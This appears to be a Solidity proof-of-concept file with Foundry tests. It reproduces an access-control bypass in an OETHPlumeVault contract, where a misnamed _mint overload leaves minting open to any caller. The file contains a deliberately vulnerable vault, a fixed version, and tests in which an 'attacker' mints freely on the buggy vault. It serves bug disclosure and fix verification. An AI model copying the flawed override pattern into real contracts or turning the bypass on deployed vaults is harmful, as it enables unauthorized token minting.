// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

/**
 * @title PoC: OETHPlumeVault Access Control Bypass
 * @notice Demonstrates that OETHPlumeVault._mint(address, uint256, uint256) is dead code.
 *
 * The bug: OETHPlumeVault defines _mint(address, uint256, uint256) to add an access control
 * check (strategist/governor only). But VaultCore's external mint functions call _mint(uint256),
 * which is a DIFFERENT function. OETHPlumeVault does NOT override _mint(uint256), so the
 * access control is never executed.
 *
 * This PoC creates a minimal reproduction that demonstrates the Solidity function resolution
 * issue at the contract level.
 */

// Minimal reproduction of the bug pattern
contract BaseVault {
    event MintCalled(string which, address sender);

    // External entry point -- calls _mint(uint256)
    function mint(
        address,
        uint256 _amount,
        uint256
    ) external {
        _mint(_amount); // Resolves to _mint(uint256)
    }

    function mint(uint256 _amount) external {
        _mint(_amount); // Resolves to _mint(uint256)
    }

    // Internal function that ACTUALLY gets called
    function _mint(uint256 _amount) internal virtual {
        emit MintCalled("BaseVault._mint(uint256)", msg.sender);
        // In real code: mints tokens, transfers assets, etc.
    }
}

// Reproduction of the OETHPlumeVault bug
contract BuggyPlumeVault is BaseVault {
    address public strategistAddr;
    address public governor;

    constructor(address _strategist, address _governor) {
        strategistAddr = _strategist;
        governor = _governor;
    }

    // THIS FUNCTION IS DEAD CODE -- never called by any entry point
    function _mint(
        address,
        uint256 _amount,
        uint256
    ) internal virtual {
        require(
            msg.sender == strategistAddr || msg.sender == governor,
            "Caller is not the Strategist or Governor"
        );
        // The super._mint(_amount) call here would call BaseVault._mint(uint256)
        // but this entire function is unreachable
        super._mint(_amount);
        emit MintCalled("BuggyPlumeVault._mint(address,uint256,uint256)", msg.sender);
    }
}

// Fixed version for comparison
contract FixedPlumeVault is BaseVault {
    address public strategistAddr;
    address public governor;

    constructor(address _strategist, address _governor) {
        strategistAddr = _strategist;
        governor = _governor;
    }

    // CORRECTLY overrides _mint(uint256)
    function _mint(uint256 _amount) internal virtual override {
        require(
            msg.sender == strategistAddr || msg.sender == governor,
            "Caller is not the Strategist or Governor"
        );
        super._mint(_amount);
        emit MintCalled("FixedPlumeVault._mint(uint256)", msg.sender);
    }
}

// Test contract that demonstrates the bypass
import "forge-std/Test.sol";

contract PlumeVaultMintBypassTest is Test {
    BuggyPlumeVault buggyVault;
    FixedPlumeVault fixedVault;

    address strategist = address(0x1);
    address governor = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        buggyVault = new BuggyPlumeVault(strategist, governor);
        fixedVault = new FixedPlumeVault(strategist, governor);
    }

    /// @notice Demonstrates that ANY user can mint on the buggy vault
    function test_buggy_anyoneCanMint() public {
        vm.prank(attacker);
        // This should revert if access control worked, but it SUCCEEDS
        buggyVault.mint(1 ether);
        // No revert = bug confirmed
    }

    /// @notice Demonstrates that ANY user can mint via 3-param entry point too
    function test_buggy_anyoneCanMint_3param() public {
        vm.prank(attacker);
        // This also succeeds -- same underlying _mint(uint256) is called
        buggyVault.mint(address(0), 1 ether, 0);
        // No revert = bug confirmed
    }

    /// @notice Demonstrates that the fixed vault correctly reverts
    function test_fixed_attackerReverts() public {
        vm.prank(attacker);
        vm.expectRevert("Caller is not the Strategist or Governor");
        fixedVault.mint(1 ether);
    }

    /// @notice Demonstrates that strategist CAN mint on fixed vault
    function test_fixed_strategistCanMint() public {
        vm.prank(strategist);
        fixedVault.mint(1 ether);
        // No revert = correct behavior
    }

    /// @notice Demonstrates that governor CAN mint on fixed vault
    function test_fixed_governorCanMint() public {
        vm.prank(governor);
        fixedVault.mint(1 ether);
        // No revert = correct behavior
    }
}
